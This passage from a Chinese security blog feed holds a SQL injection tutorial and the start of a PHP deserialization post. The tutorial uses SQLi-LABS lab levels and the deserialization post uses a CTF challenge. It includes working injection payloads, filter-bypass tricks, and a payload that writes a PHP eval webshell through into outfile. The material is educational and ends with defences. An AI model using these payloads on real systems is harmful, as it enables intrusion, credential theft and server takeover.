//更新xml文档</li><li>XML_document 是strings格式，为 xml文档对象的名称</li><li>XPath_string (Xpath 格式的字符串)</li><li>new_value，String 格式，替换查找到的符合条件的数据</li></ul><p>使用方法与extractvalue报错注入类似。区别为updatexml有<strong>三个参数</strong>。如下语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、POST注入"><a href="#4、POST注入" class="headerlink" title="4、POST注入"></a>4、POST注入</h2><h3 id="使用工具burpsuie进行重放"><a href="#使用工具burpsuie进行重放" class="headerlink" title="使用工具burpsuie进行重放"></a>使用工具burpsuie进行重放</h3><p>在GET注入中，我们可以直接在url的参数中修改我们的内容。在POST注入中，我们该如何放置我们的SQL语句呢？</p><p>我们以SQLi-LABS-less11进行演示：</p><p><img src="https://img-blog.csdnimg.cn/2021020415381535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到显示在我们面前的是一个登录框，不管我们输入什么，url都不会有任何变化。因此在url中注入我们的SQL语句是无效的。此时，我们可以利用burpsuite进行抓包。（不了解burpsuite的可以学习一下他的简单用法。）</p><ul><li>我们在登录框分别输入user;password进行抓包，并发送到Repeater模块重放入下图所示：</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204153824963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们在user后加单引号，点击Go可以看到页面发生了报错</li></ul><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;user&#39;&amp;passwd&#x3D;password&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153836589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>接着我们在user’ 后添加# 注释掉后边的内容可以看到页面恢复了正常。</li></ul><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;user&#39; #&amp;passwd&#x3D;password&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153852704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>由此我们可以在此处进行我们的SQL语句构造。<strong>（所需要测试的步骤可参考上文，仅是注入的地方从原来的url改为图上所示位置。</strong></li></ul><h3 id="使用hackbar插件进行注入"><a href="#使用hackbar插件进行注入" class="headerlink" title="使用hackbar插件进行注入"></a>使用hackbar插件进行注入</h3><p>若我们知道提交的变量是什么，可直接使用hackbar插件进行POST注入。（此种方法比较局限）</p><p><img src="https://img-blog.csdnimg.cn/20210204153902822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5、Cookie注入、Http-referer注入、User-Agent注入"><a href="#5、Cookie注入、Http-referer注入、User-Agent注入" class="headerlink" title="5、Cookie注入、Http-referer注入、User-Agent注入"></a>5、Cookie注入、Http-referer注入、User-Agent注入</h2><p>SQL注入作为一种很常见的攻击方式被越来越多的人所知晓。且绝大多数开发人员在开发过程中会对用户传入的参数进行适当的过滤，如添加黑名单，对GET，POST方式提交的数据进行了参数过滤。然而对通过Cookie方式提交的数据却并没有过滤。而Cookie注入说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p><p>例如：SQLi-LABS-less20；账号密码均为admin 进行登陆。</p><p><img src="https://img-blog.csdnimg.cn/20210204153932108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204153943461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用burpsuite进行抓包并发送至repeater模块，我们看到cookie参数：Cookie: uname=admin</p><p><img src="https://img-blog.csdnimg.cn/20210204153957840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来我们在此处进行常规的SQL注入即可。</p><ul><li>如：查看字段数</li></ul><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; order by 3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204154011857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>查看版本信息及数据库</li></ul><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; and 1&#x3D;2 union select database(),version(),3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415402649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>……</li></ul><p><strong>Http-referer</strong>注入、<strong>User-Agent</strong>注入与<strong>Cookie</strong>注入大体类似，抓包后在不同地点注入即可。</p><h2 id="6、SQL注入读写文件"><a href="#6、SQL注入读写文件" class="headerlink" title="6、SQL注入读写文件"></a>6、SQL注入读写文件</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>我们可以利用通过SQL语法读取服务器上的一些特定的文件。如一些配置文件来获取数据库用户名密码，或者一些源码    等。利用函数：</code></pre><ul><li>load_file(file_name)                    //读取文件并返回该文件的内容作为一个字符串。</li></ul><p><strong>前提条件：</strong></p><ul><li><p>须有读取权限，且文件完全可读            （在本地环境搭建测试时,mysql全局变量的配置中secure_file_priv 的值不能是null：        </p></li><li><p>secure_file_priv = 空的时候 ，任意读写</p><pre><code>                secure_file_priv = 某个路径的时候，只能在规定的那个路径下读写                    secure_file_priv = null 不能读写）</code></pre></li><li><p>要知道读写<strong>绝对</strong>路径</p><p> 以SQLi-LABS-less1为例：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>我们可以直接在显示位上注入我们的SQL命令。如：</code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&quot;绝对路径&quot;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>绝对路径的获取方法：1、经验；2、根据一些报错信息中获取。</code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><ul><li><p>into outfile</p><p>  以SQLi-LABS-less1为例：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>我们可以利用into outfile将一句话木马写入到某个路径</code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&quot;&lt;?php@eval($_GET[&#39;test&#39;]);?&gt;&quot; into outfile &#39;绝对路径&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><p>前置知识</p><ul><li>GBK编码方式用两个字节表示一个字符</li><li>ASCII                   一个字节表示一个字符</li><li>MYSQL数据库默认字符集是GBK等宽字节字符集。（宽字节字符集还有GB2312、GB18030、BIG5等）</li><li>PHP中编码为GBK，函数执行添加的是ASCII编码。</li><li>addslashes()                //函数返回在预定义字符之前添加反斜杠 \ 的字符串。</li></ul><p>那么什么是宽字节注入呢？下面我们直接用实例来讲解：</p><p>下面以SQLi-LABS-less32为例</p><p><img src="https://img-blog.csdnimg.cn/20210204154057285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们按照正常的SQL注入流程，首先添加单引号，看页面是否发生变化。</li></ul><p><img src="https://img-blog.csdnimg.cn/2021020415410783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们看到页面没有发生变化，然而仔细观察下面的提示信息后，我们发现在我们的 <strong>1’</strong> 中件被自动添加了一个 <strong>反斜杠</strong> ,即**1\‘**。    显然我们输入的单引号被转义了。我们都知道被转义后的单引号它仅仅是个只能显示符号（像花瓶儿一样，除了观赏之外他无法再发挥任何作用）。所以我们想绕过这个转义，就必须把 ‘*<em>\*</em>‘ 去掉。</li></ul><p>由此引入我们的宽字节：</p><ul><li>反斜杠在十六进制中为**%5C<strong>， 那么</strong>1\‘  =  **<strong>1%5C%27</strong>.</li><li>我们可以在反斜杠前加%df，即  1%df%5C%27  </li><li>如果程序的默认字符集是GBK等宽字节字符集，MySQL使用的编码也是GBK时。认为 <strong>%df%5c</strong>是一个<strong>宽字符</strong>，也就是<strong>縗</strong>。也就是说：<code>1%df\&#39;</code>= <code>1%df%5c%27</code>=<code>1縗’</code>，有了单引号就好注入了。</li></ul><p>如下图所示：</p><p><code>http://IP/Less-32/?id=1%df&#39; --+</code></p><p><img src="https://img-blog.csdnimg.cn/2021020415411967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>附：GBK编码范围：8140－FEFE</p><h2 id="8、二次注入"><a href="#8、二次注入" class="headerlink" title="8、二次注入"></a>8、二次注入</h2><p>所谓二次注入：</p><p>攻击者<strong>构造</strong>的恶意数据在<strong>存储</strong>在数据库之后，恶意数据被数据库服务器误认为是正常的数据进行<strong>引用</strong>，从而进入到SQL查询语句中运行而导致的注入。</p><p>例：在前文宽字节注入中我们提到过的一个函数： <strong>addslashes()</strong></p><p>假使我们注入的参数为<code>1&#39;</code>,经过<strong>addslashes</strong>转义后变为了<code>1\&#39;</code>。  然而<strong>addslashes</strong>虽然对<code>&#39;</code>进行了<code>\</code>转义,但是<code>\</code>并不会插入到数据库中，在写入数据库时仍为<code>1&#39;</code>,这样，我们在下一次调用这个参数的时候，<code>&#39;</code>不会被转义，从而触发了    SQL注入。由此便形成了<strong>二次注入</strong>。</p><p>我们以SQLi-LABS-less24为例（为了更直观此处环境为本地搭建）</p><ul><li>我们进行常规的SQL注入。（显然是失败的）</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154144946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204154158300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们在查看源代码发现在登陆处的username和password都经过了<strong>mysql_real_escape_string</strong>函数的转义</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154232900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>返回登陆页我们看到New User click here? 点击，不妨注册一下。（账号：admin’# 密码：123456）如下图：</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154257435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>注册成功后我们查看一下数据库，可以看到转义符号<code>\</code>并没有被存储在数据库中。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154307196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>当我们用注册的账号密码（admin’# ; 123456）登陆后，出现一个修改密码的界面。我们进行修改密码：新密码为：qweasd</p><p>  <img src="https://img-blog.csdnimg.cn/20210204154316670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><ul><li><p>密码修改后我们直接看看数据库，看看有什么变化？</p></li><li><p>可以看到<code>admin&#39;#</code>密码似乎并没有发生变化，而管理员账号admin 变成了我们输入的新密码。（这样我们直接修改了管理员的密码）那么为什么会这样呢？？？</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154325658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们查看一下密码修改的源代码</li></ul><p><img src="https://img-blog.csdnimg.cn/2021020415434595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>SQL语句是这样的</li></ul><pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>而实际执行的语句是这样的：</li></ul><pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;qweasd&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204154402812.png" alt="在这里插入图片描述"></p><ul><li>当我们提交用户名 <code>admin&#39;#</code> 修改密码为 qweasd的时候，<code>#</code>把后面的都给注释了，所以就是修改了admin用户的密码为 qweasd。</li></ul><h2 id="9、Access偏移注入"><a href="#9、Access偏移注入" class="headerlink" title="9、Access偏移注入"></a>9、Access偏移注入</h2><p>（此种方法比较靠运气，可做了解）</p><pre><code>适用于在Accesss数据库中已知表名，无法获取字段的SQL注入。流程：</code></pre><ol><li><pre><code>判断字段数 order by  </code></pre></li><li><pre><code>判断表名</code></pre></li></ol><pre><code> 首先我们利用`*`代替字段长度，从最后一个字段6开始，逐步缩减字段数。如下所示    union select 1,2,3,4,5,6 from admin         union select 1,2,3,4,5,* from admin         union select 1,2,3,4,* from admin         union select 1,2,3,* from admin         ... ...   **当缩减到某一行时，随机暴出来某一列数据**（要记住爆出数据的字段数）    有这样一个计算公式计算公式         若共有30个字段，在第22个字段暴出数据          30-21=9    **(admin为表名)**    union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin         union select 1,2,3,4,5,6,7,8,9,10,11,12,*a.id,b.id*,* from (admin as a inner join admin as b on a.id=b.id)          union select 1,2,3,*a.id,b.id,c.id*,* from( (admin as a inner join admin as b on a.id=b.id) inner join admin as c on                    a.id=c.id)若偏移失败可去掉斜体重新尝试。</code></pre><h2 id="SQL注入过滤与绕过"><a href="#SQL注入过滤与绕过" class="headerlink" title="SQL注入过滤与绕过"></a>SQL注入过滤与绕过</h2><p>过滤，顾名思义，将一些敏感字符过滤掉，从而达到一个防止注入的目的。</p><p>绕过，使用某种方法来绕过过滤的内容，从而达到继续注入的目的。</p><p>此处介绍几种常见的绕过方式，这些方法不局限于SQL注入，在其它web安全漏洞进行绕过时也可作为思路进行发散。</p><h3 id="1、大小写绕过"><a href="#1、大小写绕过" class="headerlink" title="1、大小写绕过"></a>1、大小写绕过</h3><p>若程序只是设置了关键字过滤，（发现关键字的出现就把他过滤掉而不是对他的深层含义进行解析过滤）由于数据库的查询语句对大小写并不敏感，我们可以使用大小写字母转换来进行绕过。例如：select 可用SeLeCt代替。</p><h3 id="2、双写绕过"><a href="#2、双写绕过" class="headerlink" title="2、双写绕过"></a>2、双写绕过</h3><p>若程序设置了关键字过滤为空。</p><p>例： <code>union -&gt;空</code>   我们可以使用双写进行过滤 <code>uniunionon  -&gt;  uni空on  -&gt;  union</code>            (<strong>注意</strong>：这里的<strong>空</strong>仅是为了看起来直观一些，指的是什么都没有，不是字符空)</p><h3 id="3、编码绕过"><a href="#3、编码绕过" class="headerlink" title="3、编码绕过"></a>3、编码绕过</h3><p>可尝试使用url十六进制加密进行绕过 </p><p><code>or -&gt; %6f%72</code></p><p>ASCII码转字符进行绕过</p><p><code>user -&gt;  char(117)+char(115)+char(101)+char(114)</code></p><h3 id="4、内联注释绕过"><a href="#4、内联注释绕过" class="headerlink" title="4、内联注释绕过"></a>4、内联注释绕过</h3><p>在Mysql中，内联注释中的内容可以被当作SQL语句执行。<code>/*! */</code></p><p>例：<code>select * from admin  -&gt; /*!select*/ * from admin</code></p><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><h3 id="1、严格分配权限"><a href="#1、严格分配权限" class="headerlink" title="1、严格分配权限"></a>1、严格分配权限</h3><p>对于非管理员用户的要禁止其对数据库的操作权限。</p><h3 id="2、黑白名单"><a href="#2、黑白名单" class="headerlink" title="2、黑白名单"></a>2、黑白名单</h3><p>使用黑名单禁止一些敏感数据的出现，如使用正则表达式过滤传入的参数。</p><p>使用白名单来规范用户的输入，严格限定参数类型和格式。如手机号输入：仅允许用户输入0-9的数字且只能是11位。</p><h3 id="3、严格控制输出。"><a href="#3、严格控制输出。" class="headerlink" title="3、严格控制输出。"></a>3、严格控制输出。</h3><p>对于一些错误的操作，只告诉用户对或者是错，尽量避免一些敏感信息出现在报错信息中。</p><h3 id="4、预编译防止SQL注入"><a href="#4、预编译防止SQL注入" class="headerlink" title="4、预编译防止SQL注入"></a>4、预编译防止SQL注入</h3><p>将SQL语句在程序运行前已经进行预编译，那么接下来用户不论输入什么都不会影响到SQL语句的执行，由此SQL语句预编译可以有效防御SQL注入。</p><h3 id="5、使用安全设备"><a href="#5、使用安全设备" class="headerlink" title="5、使用安全设备"></a>5、使用安全设备</h3><p>如WAF、数据库云审计、云防护、IPS等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2022/01/15/php-fan-xu-lie-hua/"/>
      <url>/2022/01/15/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>为什么要进行序列化</strong></p><p>当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而<strong>序列化</strong>的目的时把变量保存在硬盘中，用到时可方便的通过<strong>反序列化</strong>把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中，同时不丢失其类型和结构。利于对象的<strong>保存</strong>和<strong>传输</strong>。<br><img src="https://img-blog.csdnimg.cn/20210429223736297.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h2><table><thead><tr><th>序列化</th><th>反序列化</th></tr></thead><tbody><tr><td>对象转换为字符串</td><td>特定格式的字符串转换为对象</td></tr><tr><td>函数：serialize()</td><td>函数：unseriasize()</td></tr></tbody></table><p><strong>serialize():</strong></p><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p><p>eg:<br><img src="https://img-blog.csdnimg.cn/20210429223801901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>unserialize():</strong></p><p>与 serialize() 对应，unserialize()用于将serialize() 函数序列化后的对象或数组进行反序列化，并返回原始对象结构。</p><p><img src="https://img-blog.csdnimg.cn/20210429223824617.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>如果传递的字符串不可反序列化，则返回 FALSE，并产生一个E_NOTICE。</p><p><img src="https://img-blog.csdnimg.cn/20210429223936636.jpg" alt="在这里插入图片描述"></p><p><strong>字符串结构解释</strong></p><p><strong>a:4:{s:4:”name”;s:4:”twds”;s:3:”age”;s:2:”22”;s:3:”sex”;s:3:”男”;s:5:”phone”;s:6:”123456”;}</strong></p><ul><li>a-&gt;array</li><li>s-&gt;strings</li><li>a:4-&gt;代表集合中有4个元素</li><li>s:4:’name’-&gt;类型 为string:变量长度为4个字节:变量名为name。（之后同理）</li></ul><h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p><strong>PHP中把以两个下划线__开头的方法称为魔术方法</strong></p><table><thead><tr><th>常见php魔术方法</th><th></th></tr></thead><tbody><tr><td>__construct()</td><td>类的构造函数，当一个对象创建时被调用</td></tr><tr><td>__destruct()</td><td>类的析构函数，当一个对象销毁时被调用</td></tr><tr><td>__wakeup()</td><td>执行unserialize()时会先调用这个函数</td></tr><tr><td>__sleep()</td><td>执行serialize()时会先调用这个函数</td></tr><tr><td>__toString()</td><td>类被当成字符串时的被调用</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p><strong>产生反序列化的原因：</strong></p><p>根本原因：是程序没有对用户输入的反序列化字符串进行检测，导致<strong>反序列化过程</strong>可以被<strong>用户</strong>恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p><strong>漏洞产生条件：</strong></p><ul><li>unserialize()函数的参数可控</li><li>php中有可以利用的类并且类中有魔术方法</li></ul><h2 id="CTF真题"><a href="#CTF真题" class="headerlink" title="CTF真题"></a>CTF真题</h2><p><strong>2020-网鼎杯-青龙组-Web-AreUSerialz</strong></p><p>题目源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token 